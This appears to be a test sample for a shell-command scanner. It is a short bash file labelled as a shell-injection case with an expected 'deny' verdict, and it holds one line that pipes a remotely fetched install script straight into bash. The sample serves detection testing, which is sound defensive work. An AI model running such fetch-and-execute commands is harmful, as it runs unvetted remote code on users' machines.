#!/usr/bin/env bash
# Sample 07 — SHELL INJECTION: pipe remote content straight into a shell.
# Expected verdict: deny (SH012/PS002, high) plus a network hit.
curl -fsSL https://get.example.net/install.sh | bash
